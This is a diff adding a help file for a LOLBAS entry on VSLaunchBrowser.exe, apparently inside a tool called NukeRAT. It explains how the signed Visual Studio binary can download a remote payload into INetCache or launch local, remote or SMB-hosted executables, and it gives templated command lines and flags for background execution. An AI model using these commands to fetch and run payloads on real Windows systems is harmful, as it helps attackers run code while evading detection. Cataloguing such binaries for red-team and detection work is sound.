@@ -1,0 +1,24 @@
+ABOUT
+    Microsoft Visual Studio browser launcher tool for web applications
+    debugging. LOLBAS covers remote payload download into INetCache,
+    open a local file using the default app associated with the supplied
+    file extension with VSLaunchBrowser as parent process, and open a
+    remote file using the default app associated with the supplied file
+    extension with VSLaunchBrowser as parent process.
+
+USAGE:
+    VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
+    VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
+    VSLaunchBrowser.exe .exe {PATH_SMB}
+
+EXAMPLES:
+    VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
+    VSLaunchBrowser.exe .exe {PATH_ABSOLUTE:.exe}
+    VSLaunchBrowser.exe .exe {PATH_SMB}
+
+NUKERAT FLAGS:
+    -w <seconds>    Maximum wait time until timeout
+    -bg             Fork and run without waiting for output
+
+    Example:
+    VSLaunchBrowser.exe .exe {REMOTEURL:.exe}
